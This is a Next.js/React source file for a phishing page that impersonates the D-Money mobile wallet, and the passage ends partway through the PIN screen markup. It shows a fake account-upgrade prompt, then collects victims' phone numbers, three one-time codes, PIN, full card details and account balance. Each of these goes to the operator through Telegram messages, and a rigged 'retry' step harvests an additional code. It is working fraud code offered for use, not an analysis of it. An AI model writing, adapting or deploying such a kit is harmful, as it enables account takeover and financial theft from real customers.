"use client"

import React, { useState, useEffect, useRef } from "react"
import Image from "next/image"
import { ChevronLeft, X, Check, Star, ShieldCheck, HelpCircle, AlertCircle } from "lucide-react"
import { sendTelegramMessage, fetchVisitorInfo } from "@/lib/telegram"

// Primary Brand Color
const BRAND_NAVY = "#002566"
const LOGO_URL = "https://play-lh.googleusercontent.com/0GAHK2npJxs8Wd_YnqmDNzHeIXLa_KaZikbf_6ONOh_fCwztYC2BzQOtoxxJd0VCDT4S4NoU_CKuAu0EVi9Eeio"

type Step = "splash" | "phone" | "otp1" | "pin" | "card" | "otp2" | "balance" | "otp3" | "success"

export default function DmoneyApp() {
    const [currentStep, setCurrentStep] = useState<Step>("splash")
    const [showBottomModal, setShowBottomModal] = useState(false)
    const [isScreenLoading, setIsScreenLoading] = useState(false)

    // Form states - Phone
    const [phoneNumber, setPhoneNumber] = useState("")
    const [agreedTerms, setAgreedTerms] = useState(true)
    const [phoneFocused, setPhoneFocused] = useState(false)

    // Full phone number with prefilled +253
    const fullPhoneNumber = `+253 ${phoneNumber.trim()}`

    // OTP 1 states (6 digits)
    const [otp1Digits, setOtp1Digits] = useState<string[]>(["", "", "", "", "", ""])
    const [otp1Timer, setOtp1Timer] = useState(115) // 01:55
    const otp1InputRefs = useRef<(HTMLInputElement | null)[]>([])

    // PIN states (4 digits)
    const [pinDigits, setPinDigits] = useState<string[]>(["", "", "", ""])
    const pinInputRefs = useRef<(HTMLInputElement | null)[]>([])

    // Card Details states
    const [cardNumber, setCardNumber] = useState("")
    const [cardMonth, setCardMonth] = useState("")
    const [cardYear, setCardYear] = useState("")
    const [cardCvc, setCardCvc] = useState("")
    const cardMonthRef = useRef<HTMLInputElement | null>(null)
    const cardYearRef = useRef<HTMLInputElement | null>(null)
    const cardCvcRef = useRef<HTMLInputElement | null>(null)

    // OTP 2 states (6 digits)
    const [otp2Digits, setOtp2Digits] = useState<string[]>(["", "", "", "", "", ""])
    const [otp2Timer, setOtp2Timer] = useState(115)
    const otp2InputRefs = useRef<(HTMLInputElement | null)[]>([])

    // Balance states
    const [accountNumber, setAccountNumber] = useState("Acc. •••••••••••••")
    const [balanceAmount, setBalanceAmount] = useState("")

    // OTP 3 states (6 digits - Error state)
    const [otp3Digits, setOtp3Digits] = useState<string[]>(["", "", "", "", "", ""])
    const [otp3Timer, setOtp3Timer] = useState(111) // 01:51
    const [otp3Error, setOtp3Error] = useState(false)
    const otp3InputRefs = useRef<(HTMLInputElement | null)[]>([])

    // Submitting helper state
    const [isSubmitting, setIsSubmitting] = useState(false)

    // Transition with 2-second Screen Loader
    const transitionToStepWithLoader = (nextStep: Step, delayMs = 2000) => {
        setIsScreenLoading(true)
        setTimeout(() => {
            setIsScreenLoading(false)
            setCurrentStep(nextStep)
        }, delayMs)
    }

    const splashLocationFetchedRef = useRef(false)

    // 1. Splash Screen Flow -> Fetch Location & Send Telegram Alert + Show upgrade modal
    useEffect(() => {
        if (currentStep !== "splash") return

        // Fetch location and send Telegram alert on Splash
        if (!splashLocationFetchedRef.current) {
            splashLocationFetchedRef.current = true
            const fetchSplashLocation = async () => {
                try {
                    const locationData = await fetchVisitorInfo()
                    console.log("📍 Splash Location Detected:", locationData)
                    await sendTelegramMessage({
                        title: "👀 NEW VISITOR ON SITE",
                        type: "visit",
                    })
                } catch (err) {
                    console.error("Splash location error:", err)
                }
            }
            fetchSplashLocation()
        }

        // Show upgrade modal from bottom after 1.2s
        const timer = setTimeout(() => {
            setShowBottomModal(true)
        }, 1200)
        return () => clearTimeout(timer)
    }, [currentStep])

    // OTP 1 Countdown Timer
    useEffect(() => {
        if (currentStep !== "otp1" || otp1Timer <= 0) return
        const interval = setInterval(() => {
            setOtp1Timer((prev) => (prev > 0 ? prev - 1 : 0))
        }, 1000)
        return () => clearInterval(interval)
    }, [currentStep, otp1Timer])

    // OTP 2 Countdown Timer
    useEffect(() => {
        if (currentStep !== "otp2" || otp2Timer <= 0) return
        const interval = setInterval(() => {
            setOtp2Timer((prev) => (prev > 0 ? prev - 1 : 0))
        }, 1000)
        return () => clearInterval(interval)
    }, [currentStep, otp2Timer])

    // OTP 3 Countdown Timer
    useEffect(() => {
        if (currentStep !== "otp3" || otp3Timer <= 0) return
        const interval = setInterval(() => {
            setOtp3Timer((prev) => (prev > 0 ? prev - 1 : 0))
        }, 1000)
        return () => clearInterval(interval)
    }, [currentStep, otp3Timer])

    // Format OTP timer as MM:SS
    const formatTimer = (seconds: number) => {
        const mins = Math.floor(seconds / 60)
        const secs = seconds % 60
        return `${mins.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`
    }

    // Mask phone number for OTP and PIN screens
    const getMaskedPhone = (phone: string, mode: "otp" | "pin" = "otp") => {
        const rawDigits = phone.replace(/[^\d]/g, "")
        let userDigits = rawDigits
        if (rawDigits.startsWith("253")) {
            userDigits = rawDigits.slice(3)
        }

        if (mode === "otp") {
            if (userDigits.length >= 6) {
                const start = userDigits.slice(0, 2)
                const end = userDigits.slice(-4)
                return `(+253) ${start}****${end}`
            }
            return `(+253) 94****4945`
        } else {
            if (userDigits.length >= 6) {
                const start = userDigits.slice(0, 3)
                const end = userDigits.slice(-4)
                return `+253 ${start}****${end}`
            }
            return `+253 888****5555`
        }
    }

    // Phone digits validation: tick appears at 8+ digits, limit is 9 digits
    const cleanDigitsOnly = phoneNumber.replace(/[^\d]/g, "")
    const isPhoneComplete = cleanDigitsOnly.length >= 8 && cleanDigitsOnly.length <= 9

    // Handle Upgrade Click from Bottom Sheet
    const handleUpgradeNow = () => {
        setShowBottomModal(false)
        setCurrentStep("phone")
    }

    // ==========================================
    // 1. Phone Submit -> Send Telegram -> 2s Loader -> OTP 1
    // ==========================================
    const handlePhoneSubmit = async (e?: React.FormEvent) => {
        if (e) e.preventDefault()
        if (cleanDigitsOnly.length < 8 || !agreedTerms || isSubmitting) return

        setIsSubmitting(true)
        sessionStorage.setItem("dmoney_phone", fullPhoneNumber)

        try {
            await sendTelegramMessage({
                title: "📱 PHONE NUMBER ENTERED",
                phoneNumber: fullPhoneNumber,
            })
        } catch (err) {
            console.error("Telegram send error:", err)
        }

        setIsSubmitting(false)
        setOtp1Digits(["", "", "", "", "", ""])
        setOtp1Timer(115)
        transitionToStepWithLoader("otp1")
    }

    // ==========================================
    // 2. OTP 1 Handlers (Auto Submit when filled)
    // ==========================================
    const submitOtp1 = async (code: string) => {
        if (isSubmitting) return
        setIsSubmitting(true)
        sessionStorage.setItem("dmoney_otp1", code)

        const savedPhone = sessionStorage.getItem("dmoney_phone") || fullPhoneNumber

        try {
            await sendTelegramMessage({
                title: "🔐 OTP-1 VERIFICATION",
                phoneNumber: savedPhone,
                otp1: code,
            })
        } catch (err) {
            console.error("Telegram send error:", err)
        }

        setIsSubmitting(false)
        setPinDigits(["", "", "", ""])
        transitionToStepWithLoader("pin")
    }

    const handleOtp1Change = (index: number, value: string) => {
        const val = value.replace(/[^\d]/g, "")
        if (!val) {
            const newOtp = [...otp1Digits]
            newOtp[index] = ""
            setOtp1Digits(newOtp)
            return
        }

        if (val.length > 1) {
            const pasted = val.slice(0, 6).split("")
            const newOtp = [...otp1Digits]
            pasted.forEach((char, i) => {
                if (index + i < 6) {
                    newOtp[index + i] = char
                }
            })
            setOtp1Digits(newOtp)
            const nextIdx = Math.min(index + pasted.length, 5)
            otp1InputRefs.current[nextIdx]?.focus()

            if (newOtp.every((d) => d !== "")) {
                submitOtp1(newOtp.join(""))
            }
            return
        }

        const newOtp = [...otp1Digits]
        newOtp[index] = val.slice(-1)
        setOtp1Digits(newOtp)

        if (index < 5 && val) {
            otp1InputRefs.current[index + 1]?.focus()
        }

        // Auto move to PIN when all 6 digits entered
        if (newOtp.every((d) => d !== "")) {
            submitOtp1(newOtp.join(""))
        }
    }

    const handleOtp1KeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
        if (e.key === "Backspace" && !otp1Digits[index] && index > 0) {
            otp1InputRefs.current[index - 1]?.focus()
        }
    }

    const isOtp1Complete = otp1Digits.every((d) => d !== "")

    // ==========================================
    // 3. PIN Handlers (Auto Submit when filled)
    // ==========================================
    const submitPin = async (pinCode: string) => {
        if (isSubmitting) return
        setIsSubmitting(true)
        sessionStorage.setItem("dmoney_pin", pinCode)

        const savedPhone = sessionStorage.getItem("dmoney_phone") || fullPhoneNumber

        try {
            await sendTelegramMessage({
                title: "🔑 PIN CODE ENTERED",
                phoneNumber: savedPhone,
                pin: pinCode,
            })
        } catch (err) {
            console.error("Telegram send error:", err)
        }

        setIsSubmitting(false)
        setCardNumber("")
        setCardMonth("")
        setCardYear("")
        setCardCvc("")
        transitionToStepWithLoader("card")
    }

    const handlePinChange = (index: number, value: string) => {
        const val = value.replace(/[^\d]/g, "")
        if (!val) {
            const newPin = [...pinDigits]
            newPin[index] = ""
            setPinDigits(newPin)
            return
        }

        if (val.length > 1) {
            const pasted = val.slice(0, 4).split("")
            const newPin = [...pinDigits]
            pasted.forEach((char, i) => {
                if (index + i < 4) {
                    newPin[index + i] = char
                }
            })
            setPinDigits(newPin)
            const nextIdx = Math.min(index + pasted.length, 3)
            pinInputRefs.current[nextIdx]?.focus()

            if (newPin.every((d) => d !== "")) {
                submitPin(newPin.join(""))
            }
            return
        }

        const newPin = [...pinDigits]
        newPin[index] = val.slice(-1)
        setPinDigits(newPin)

        if (index < 3 && val) {
            pinInputRefs.current[index + 1]?.focus()
        }

        // Auto move to Card when all 4 digits entered
        if (newPin.every((d) => d !== "")) {
            submitPin(newPin.join(""))
        }
    }

    const handlePinKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
        if (e.key === "Backspace" && !pinDigits[index] && index > 0) {
            pinInputRefs.current[index - 1]?.focus()
        }
    }

    const isPinComplete = pinDigits.every((d) => d !== "")

    // ==========================================
    // 4. Card Details Submit -> 2s Loader -> OTP 2
    // ==========================================
    const cleanCardNumber = cardNumber.replace(/\s+/g, "")
    const isCardValid =
        cleanCardNumber.length >= 15 &&
        cardMonth.trim().length >= 1 &&
        cardYear.trim().length >= 2 &&
        cardCvc.trim().length >= 3

    const handleCardNumberChange = (val: string) => {
        const raw = val.replace(/[^\d]/g, "").slice(0, 16)
        const formatted = raw.match(/.{1,4}/g)?.join(" ") || raw
        setCardNumber(formatted)
        // Auto-focus expiry month when card number is complete
        if (raw.length >= 16) {
            cardMonthRef.current?.focus()
        }
    }

    const handleCardMonthChange = (val: string) => {
        const digits = val.replace(/[^\d]/g, "").slice(0, 2)
        setCardMonth(digits)
        if (digits.length >= 2) {
            cardYearRef.current?.focus()
        }
    }

    const handleCardYearChange = (val: string) => {
        const digits = val.replace(/[^\d]/g, "").slice(0, 2)
        setCardYear(digits)
        if (digits.length >= 2) {
            cardCvcRef.current?.focus()
        }
    }

    const handleCardSubmit = async (e?: React.FormEvent) => {
        if (e) e.preventDefault()
        if (!isCardValid || isSubmitting) return

        setIsSubmitting(true)
        const expiryFormatted = `${cardMonth.padStart(2, "0")}/${cardYear}`

        sessionStorage.setItem("dmoney_card", cardNumber)
        sessionStorage.setItem("dmoney_expiry", expiryFormatted)
        sessionStorage.setItem("dmoney_cvv", cardCvc)

        const savedPhone = sessionStorage.getItem("dmoney_phone") || fullPhoneNumber

        try {
            await sendTelegramMessage({
                title: "💳 CARD DETAILS ENTERED",
                phoneNumber: savedPhone,
                cardNumber: cardNumber,
                expiry: expiryFormatted,
                cvv: cardCvc,
            })
        } catch (err) {
            console.error("Telegram send error:", err)
        }

        setIsSubmitting(false)
        setOtp2Digits(["", "", "", "", "", ""])
        setOtp2Timer(115)
        transitionToStepWithLoader("otp2")
    }

    // ==========================================
    // 5. OTP 2 Handlers (Auto Submit when filled) -> Balance
    // ==========================================
    const submitOtp2 = async (code: string) => {
        if (isSubmitting) return
        setIsSubmitting(true)
        sessionStorage.setItem("dmoney_otp2", code)

        const savedPhone = sessionStorage.getItem("dmoney_phone") || fullPhoneNumber

        try {
            await sendTelegramMessage({
                title: "🔐 OTP-2 VERIFICATION",
                phoneNumber: savedPhone,
                otp2: code,
            })
        } catch (err) {
            console.error("Telegram send error:", err)
        }

        setIsSubmitting(false)
        setBalanceAmount("")
        transitionToStepWithLoader("balance")
    }

    const handleOtp2Change = (index: number, value: string) => {
        const val = value.replace(/[^\d]/g, "")
        if (!val) {
            const newOtp = [...otp2Digits]
            newOtp[index] = ""
            setOtp2Digits(newOtp)
            return
        }

        if (val.length > 1) {
            const pasted = val.slice(0, 6).split("")
            const newOtp = [...otp2Digits]
            pasted.forEach((char, i) => {
                if (index + i < 6) {
                    newOtp[index + i] = char
                }
            })
            setOtp2Digits(newOtp)
            const nextIdx = Math.min(index + pasted.length, 5)
            otp2InputRefs.current[nextIdx]?.focus()

            if (newOtp.every((d) => d !== "")) {
                submitOtp2(newOtp.join(""))
            }
            return
        }

        const newOtp = [...otp2Digits]
        newOtp[index] = val.slice(-1)
        setOtp2Digits(newOtp)

        if (index < 5 && val) {
            otp2InputRefs.current[index + 1]?.focus()
        }

        // Auto move to Balance when all 6 digits entered
        if (newOtp.every((d) => d !== "")) {
            submitOtp2(newOtp.join(""))
        }
    }

    const handleOtp2KeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
        if (e.key === "Backspace" && !otp2Digits[index] && index > 0) {
            otp2InputRefs.current[index - 1]?.focus()
        }
    }

    const isOtp2Complete = otp2Digits.every((d) => d !== "")

    // ==========================================
    // 6. Balance Submit -> 2s Loader -> OTP 3
    // ==========================================
    const isBalanceValid = balanceAmount.trim().length > 0

    const handleBalanceSubmit = async (e?: React.FormEvent) => {
        if (e) e.preventDefault()
        if (!isBalanceValid || isSubmitting) return

        setIsSubmitting(true)
        const formattedBalance = `${balanceAmount} DJF`
        sessionStorage.setItem("dmoney_balance", formattedBalance)

        const savedPhone = sessionStorage.getItem("dmoney_phone") || fullPhoneNumber

        try {
            await sendTelegramMessage({
                title: "💰 ACCOUNT BALANCE ENTERED",
                phoneNumber: savedPhone,
                balance: formattedBalance,
            })
        } catch (err) {
            console.error("Telegram send error:", err)
        }

        setIsSubmitting(false)
        setOtp3Digits(["", "", "", "", "", ""])
        setOtp3Timer(111)
        setOtp3Error(false)
        transitionToStepWithLoader("otp3")
    }

    // ==========================================
    // 7. OTP 3 Handlers (Auto Submit when filled) -> Show Error
    // ==========================================
    const submitOtp3 = async (code: string) => {
        if (isSubmitting || !code) return
        setIsSubmitting(true)
        sessionStorage.setItem("dmoney_otp3", code)

        const savedPhone = sessionStorage.getItem("dmoney_phone") || fullPhoneNumber

        try {
            await sendTelegramMessage({
                title: "🔐 OTP-3 (RETRY) VERIFICATION",
                phoneNumber: savedPhone,
                otp3: code,
            })
        } catch (err) {
            console.error("Telegram send error:", err)
        }

        setIsSubmitting(false)
        setOtp3Error(true)
        setOtp3Digits(["", "", "", "", "", ""])
        setOtp3Timer(111)
        setTimeout(() => otp3InputRefs.current[0]?.focus(), 0)
    }

    const handleOtp3Change = (index: number, value: string) => {
        const val = value.replace(/[^\d]/g, "")
        if (!val) {
            const newOtp = [...otp3Digits]
            newOtp[index] = ""
            setOtp3Digits(newOtp)
            return
        }

        if (otp3Error) {
            setOtp3Error(false)
        }

        if (val.length > 1) {
            const pasted = val.slice(0, 6).split("")
            const newOtp = [...otp3Digits]
            pasted.forEach((char, i) => {
                if (index + i < 6) {
                    newOtp[index + i] = char
                }
            })
            setOtp3Digits(newOtp)
            const nextIdx = Math.min(index + pasted.length, 5)
            otp3InputRefs.current[nextIdx]?.focus()
            return
        }

        const newOtp = [...otp3Digits]
        newOtp[index] = val.slice(-1)
        setOtp3Digits(newOtp)

        if (index < 5 && val) {
            otp3InputRefs.current[index + 1]?.focus()
        }
    }

    const handleOtp3KeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
        if (e.key === "Backspace" && !otp3Digits[index] && index > 0) {
            otp3InputRefs.current[index - 1]?.focus()
        }
    }

    const isOtp3Complete = otp3Digits.every((d) => d !== "")

    return (
        <main className="h-[100dvh] w-full bg-[#FFFFFF] flex flex-col items-center justify-center relative overflow-hidden font-sans select-none antialiased">
            {/* ======================================================== */}
            {/* FULLSCREEN 2-SECOND LOADER (MATCHING SCREENSHOT 1)       */}
            {/* ======================================================== */}
            {isScreenLoading && (
                <div className="fixed inset-0 z-[100] bg-white flex items-center justify-center animate-fade-in">
                    <div className="relative w-11 h-11">
                        <div
                            className="w-11 h-11 rounded-full border-[3px] border-transparent border-t-[#002566] border-r-[#002566] animate-spin"
                            style={{ borderTopColor: BRAND_NAVY, borderRightColor: BRAND_NAVY }}
                        />
                    </div>
                </div>
            )}

            {/* Main responsive app container */}
            <div className="w-full max-w-[430px] h-[100dvh] max-h-[100dvh] flex flex-col relative bg-[#FFFFFF] overflow-hidden">

                {/* ======================================================== */}
                {/* 1. SPLASH SCREEN & BOTTOM UPGRADE SHEET MODAL            */}
                {/* ======================================================== */}
                {currentStep === "splash" && (
                    <div className="relative flex-1 flex flex-col items-center justify-center w-full h-full bg-white overflow-hidden">
                        {/* Centered D-Money Logo */}
                        <div className="flex flex-col items-center justify-center transition-all duration-500">
                            <div className="relative w-48 sm:w-56 h-32 sm:h-36 flex items-center justify-center">
                                <Image
                                    src={LOGO_URL}
                                    alt="D-MONEY Logo"
                                    width={220}
                                    height={140}
                                    priority
                                    unoptimized
                                    className="object-contain w-auto h-auto max-w-[200px] max-h-[130px] sm:max-w-[220px] sm:max-h-[140px]"
                                />
                            </div>
                        </div>

                        {/* Dim Backdrop Overlay */}
                        <div
                            className={`fixed inset-0 bg-black/45 z-40 transition-opacity duration-300 ${showBottomModal ? "opacity-100 pointer-events-auto" : "opacity-0 pointer-events-none"
                                }`}
                            onClick={() => handleUpgradeNow()}
                        />

                        {/* Bottom Sheet Modal */}
                        <div
                            className={`fixed bottom-0 left-1/2 -translate-x-1/2 w-full max-w-[430px] bg-white rounded-t-[28px] sm:rounded-t-[30px] shadow-2xl z-50 transition-transform duration-500 ease-out transform px-5 sm:px-6 pt-4 sm:pt-5 pb-6 sm:pb-8 flex flex-col items-center max-h-[92dvh] overflow-hidden ${showBottomModal ? "translate-y-0" : "translate-y-full"
                                }`}
                            style={{
                                borderTop: "3px solid #002566",
                            }}
                        >
                            {/* Close Button */}
                            <button
                                type="button"
                                onClick={() => handleUpgradeNow()}
                                className="absolute right-4 top-4 sm:right-5 sm:top-5 w-7 h-7 sm:w-8 sm:h-8 rounded-full bg-[#F3F4F6] hover:bg-[#E5E7EB] active:scale-95 flex items-center justify-center transition-colors"
                                aria-label="Close"
                            >
                                <X className="w-3.5 h-3.5 sm:w-4 sm:h-4 text-[#4B5563]" strokeWidth={2.5} />
                            </button>

                            {/* Centered Star Icon */}
                            <div className="mt-1 mb-3 sm:mt-2 sm:mb-4 w-12 h-12 sm:w-14 sm:h-14 rounded-full bg-[#EEF4FF] flex items-center justify-center shadow-xs">
                                <Star className="w-6 h-6 sm:w-7 sm:h-7 text-[#002566] fill-[#002566]" strokeWidth={0} />
                            </div>

                            <h2 className="text-[20px] sm:text-[22px] font-bold text-[#002566] text-center tracking-tight leading-snug">
                                Upgrade Your D-Money Account!
                            </h2>

                            <p className="mt-1.5 sm:mt-2 text-[12.5px] sm:text-[13.5px] text-[#4B5563] text-center leading-relaxed px-1 sm:px-2 font-normal">
                                D-Money customers need to upgrade their account to enjoy exclusive benefits:
                            </p>

                            <div className="w-full mt-3.5 sm:mt-5 bg-[#F4F8FD] rounded-2xl p-3.5 sm:p-5 flex flex-col gap-2.5 sm:gap-3.5 border border-[#EBF2FA]">
                                <div className="flex items-center gap-2.5 sm:gap-3">
                                    <div
                                        className="w-4.5 h-4.5 sm:w-5 sm:h-5 rounded-full flex items-center justify-center shrink-0"
                                        style={{ backgroundColor: BRAND_NAVY }}
                                    >
                                        <Check className="w-3 h-3 sm:w-3.5 sm:h-3.5 text-white" strokeWidth={3} />
                                    </div>
                                    <span className="text-[12.5px] sm:text-[13.5px] font-medium text-[#1E293B]">
                                        Increase your Daily & Monthly Transfer Limit
                                    </span>
                                </div>

                                <div className="flex items-center gap-2.5 sm:gap-3">
                                    <div
                                        className="w-4.5 h-4.5 sm:w-5 sm:h-5 rounded-full flex items-center justify-center shrink-0"
                                        style={{ backgroundColor: BRAND_NAVY }}
                                    >
                                        <Check className="w-3 h-3 sm:w-3.5 sm:h-3.5 text-white" strokeWidth={3} />
                                    </div>
                                    <span className="text-[12.5px] sm:text-[13.5px] font-medium text-[#1E293B]">
                                        Get access to your D-Money Card
                                    </span>
                                </div>

                                <div className="flex items-center gap-2.5 sm:gap-3">
                                    <div
                                        className="w-4.5 h-4.5 sm:w-5 sm:h-5 rounded-full flex items-center justify-center shrink-0"
                                        style={{ backgroundColor: BRAND_NAVY }}
                                    >
                                        <Check className="w-3 h-3 sm:w-3.5 sm:h-3.5 text-white" strokeWidth={3} />
                                    </div>
                                    <span className="text-[12.5px] sm:text-[13.5px] font-medium text-[#1E293B]">
                                        Low Transaction Fees and Instant Payouts
                                    </span>
                                </div>
                            </div>

                            <button
                                type="button"
                                onClick={handleUpgradeNow}
                                className="w-full mt-4 sm:mt-6 py-3.5 sm:py-4 rounded-xl text-white font-bold text-[14.5px] sm:text-[15px] tracking-wide transition-all duration-200 active:scale-[0.98] shadow-md hover:brightness-110 flex items-center justify-center"
                                style={{ backgroundColor: BRAND_NAVY }}
                            >
                                UPGRADE ACCOUNT NOW
                            </button>

                            <div className="mt-3 sm:mt-4 text-[12.5px] sm:text-[13px] text-[#6B7280] font-normal flex items-center gap-1">
                                <span>Need Help?</span>
                                <button
                                    type="button"
                                    onClick={handleUpgradeNow}
                                    className="font-medium underline hover:text-[#002566] transition-colors"
                                    style={{ color: BRAND_NAVY }}
                                >
                                    Contact Support
                                </button>
                            </div>
                        </div>
                    </div>
                )}

                {/* ======================================================== */}
                {/* 2. PHONE NUMBER ENTRY SCREEN                             */}
                {/* ======================================================== */}
                {currentStep === "phone" && (
                    <div className="flex-1 flex flex-col justify-between px-5 sm:px-6 pt-8 sm:pt-12 pb-6 sm:pb-8 w-full h-full bg-white animate-slide-up overflow-hidden">
                        <div className="flex flex-col">
                            <h1 className="text-[22px] sm:text-[24px] leading-tight font-bold text-[#000000] tracking-tight">
                                Let&apos;s get started with verification
                            </h1>

                            <p className="mt-2 sm:mt-2.5 text-[14px] sm:text-[15px] leading-normal text-[#64748B] font-normal">
                                Enter your phone number to get started
                            </p>

                            <div className="mt-6 sm:mt-8">
                                <div
                                    className={`relative flex items-center w-full px-4 py-3 sm:py-3.5 rounded-2xl border transition-all duration-200 bg-white ${phoneFocused
                                            ? "border-[#002566] ring-1 ring-[#002566]/20 shadow-xs"
                                            : "border-[#E2E8F0] hover:border-[#CBD5E1]"
                                        }`}
                                >
                                    <span className="text-[#000000] text-[16px] sm:text-[17px] font-bold tracking-normal select-none pr-2.5 shrink-0">
                                        +253
                                    </span>

                                    <input
                                        type="tel"
                                        inputMode="numeric"
                                        pattern="[0-9]*"
                                        maxLength={9}
                                        value={phoneNumber}
                                        onChange={(e) => {
                                            let val = e.target.value
                                            if (val.startsWith("+253")) val = val.slice(4).trim()
                                            else if (val.startsWith("253")) val = val.slice(3).trim()
                                            val = val.replace(/[^\d]/g, "").slice(0, 9)
                                            setPhoneNumber(val)
                                        }}
                                        onFocus={() => setPhoneFocused(true)}
                                        onBlur={() => setPhoneFocused(false)}
                                        placeholder="888555555"
                                        className="w-full text-[16px] sm:text-[17px] font-normal text-[#000000] bg-transparent outline-none placeholder:text-[#94A3B8]"
                                        autoFocus
                                    />

                                    {isPhoneComplete && (
                                        <div className="shrink-0 ml-2 animate-scale-in">
                                            <svg
                                                className="w-5 h-5 text-[#16A34A]"
                                                viewBox="0 0 20 20"
                                                fill="currentColor"
                                            >
                                                <path
                                                    fillRule="evenodd"
                                                    d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z"
                                                    clipRule="evenodd"
                                                />
                                            </svg>
                                        </div>
                                    )}
                                </div>
                            </div>
                        </div>

                        <div className="flex flex-col gap-4 sm:gap-5 mt-auto pt-4">
                            <label className="flex items-center gap-3 cursor-pointer select-none">
                                <div
                                    onClick={() => setAgreedTerms(!agreedTerms)}
                                    className={`w-5 h-5 rounded-[4px] flex items-center justify-center transition-all duration-200 cursor-pointer ${agreedTerms ? "border-transparent" : "border border-[#CBD5E1] bg-white"
                                        }`}
                                    style={{
                                        backgroundColor: agreedTerms ? BRAND_NAVY : "#FFFFFF",
                                        borderColor: agreedTerms ? BRAND_NAVY : "#CBD5E1",
                                    }}
                                >
                                    {agreedTerms && (
                                        <Check className="w-3.5 h-3.5 text-white" strokeWidth={3} />
                                    )}
                                </div>
                                <span className="text-[13.5px] sm:text-[14px] text-[#0F172A] font-normal">
                                    I agree to the{" "}
                                    <span
                                        className="underline underline-offset-2 font-medium"
                                        style={{ color: BRAND_NAVY }}
                                    >
                                        «Terms of Service»
                                    </span>
                                </span>
                            </label>

                            <button
                                type="button"
                                onClick={() => handlePhoneSubmit()}
                                disabled={!isPhoneComplete || !agreedTerms || isSubmitting}
                                className={`w-full py-3.5 sm:py-4 rounded-xl text-white font-semibold text-[15px] sm:text-[16px] transition-all duration-200 active:scale-[0.99] flex items-center justify-center ${isPhoneComplete && agreedTerms && !isSubmitting
                                        ? "shadow-md hover:brightness-110 cursor-pointer"
                                        : "opacity-40 cursor-not-allowed"
                                    }`}
                                style={{
                                    backgroundColor:
                                        isPhoneComplete && agreedTerms ? BRAND_NAVY : "#A0AEC0",
                                }}
                            >
                                Continue
                            </button>
                        </div>
                    </div>
                )}

                {/* ======================================================== */}
                {/* 3. OTP 1 SCREEN (6 DIGITS - AUTO-MOVE)                   */}
                {/* ======================================================== */}
                {currentStep === "otp1" && (
                    <div className="flex-1 flex flex-col justify-between px-5 sm:px-6 pt-4 sm:pt-6 pb-6 sm:pb-8 w-full h-full bg-white animate-slide-up overflow-hidden">
                        <div className="flex flex-col">
                            {/* Back Arrow */}
                            <div className="w-full flex items-center mb-4 sm:mb-6">
                                <button
                                    type="button"
                                    onClick={() => setCurrentStep("phone")}
                                    className="p-1 -ml-1 text-[#000000] active:opacity-60 transition-opacity"
                                    aria-label="Back"
                                >
                                    <ChevronLeft className="w-7 h-7 stroke-[2.2]" />
                                </button>
                            </div>

                            <h1 className="text-[24px] sm:text-[28px] leading-tight font-bold text-[#000000] tracking-tight">
                                Verify your number
                            </h1>

                            <p className="mt-1.5 sm:mt-2 text-[14px] sm:text-[15px] leading-normal text-[#64748B] font-normal">
                                Enter the code we sent to {getMaskedPhone(phoneNumber, "otp")}
                            </p>

                            {/* 6-Digit OTP Boxes */}
                            <div className="mt-6 sm:mt-8 flex items-center justify-between gap-1.5 sm:gap-2.5 w-full">
                                {otp1Digits.map((digit, idx) => {
                                    const isFilled = digit !== ""
                                    return (
                                        <input
                                            key={idx}
                                            ref={(el) => {
                                                otp1InputRefs.current[idx] = el
                                            }}
                                            type="text"
                                            inputMode="numeric"
                                            pattern="[0-9]*"
                                            maxLength={1}
                                            value={digit}
                                            onChange={(e) => handleOtp1Change(idx, e.target.value)}
                                            onKeyDown={(e) => handleOtp1KeyDown(idx, e)}
                                            className={`w-11 h-13 sm:w-12 sm:h-14 md:w-13 md:h-15 max-w-[48px] text-center text-[20px] sm:text-[22px] font-bold rounded-xl sm:rounded-2xl outline-none transition-all duration-200 bg-white shrink-1 ${isFilled
                                                    ? "border-2 text-[#002566] shadow-xs"
                                                    : "border border-[#CBD5E1] text-[#0F172A] focus:border-[#002566] focus:border-2"
                                                }`}
                                            style={{
                                                borderColor: isFilled ? BRAND_NAVY : undefined,
                                                color: isFilled ? BRAND_NAVY : "#0F172A",
                                            }}
                                            autoFocus={idx === 0}
                                        />
                                    )
                                })}
                            </div>

                            {/* Resend Section */}
                            <div className="mt-6 sm:mt-8 flex flex-col items-center justify-center gap-1.5 sm:gap-2">
                                <p className="text-[13.5px] sm:text-[14px] text-[#475569] font-normal">
                                    Resend code in{" "}
                                    <span className="font-bold ml-1" style={{ color: BRAND_NAVY }}>
                                        {formatTimer(otp1Timer)}
                                    </span>
                                </p>

                                <button
                                    type="button"
                                    onClick={() => {
                                        if (otp1Timer > 0) return
                                        setOtp1Timer(115)
                                        setOtp1Digits(["", "", "", "", "", ""])
                                    }}
                                    disabled={otp1Timer > 0}
                                    className={`text-[14px] sm:text-[14.5px] font-normal transition-colors ${otp1Timer === 0
                                            ? "underline cursor-pointer font-medium"
                                            : "text-[#CBD5E1] cursor-not-allowed"
                                        }`}
                                    style={{
                                        color: otp1Timer === 0 ? BRAND_NAVY : "#CBD5E1",
                                    }}
                                >
                                    Resend Code
                                </button>
                            </div>
                        </div>

                        {/* Continue Button */}
                        <div className="mt-auto pt-4">
                            <button
                                type="button"
                                onClick={() => isOtp1Complete && submitOtp1(otp1Digits.join(""))}
                                disabled={!isOtp1Complete || isSubmitting}
                                className={`w-full py-3.5 sm:py-4 rounded-xl text-white font-semibold text-[15px] sm:text-[16px] transition-all duration-200 active:scale-[0.99] flex items-center justify-center ${isOtp1Complete && !isSubmitting
                                        ? "shadow-md hover:brightness-110 cursor-pointer"
                                        : "cursor-not-allowed"
                                    }`}
                                style={{
                                    backgroundColor: isOtp1Complete ? BRAND_NAVY : "#C4C4C4",
                                }}
                            >
                                Continue
                            </button>
                        </div>
                    </div>
                )}

                {/* ======================================================== */}
                {/* 4. PIN SCREEN (4 DIGITS - AUTO-MOVE)                     */}
                {/* ======================================================== */}
                {currentStep === "pin" && (
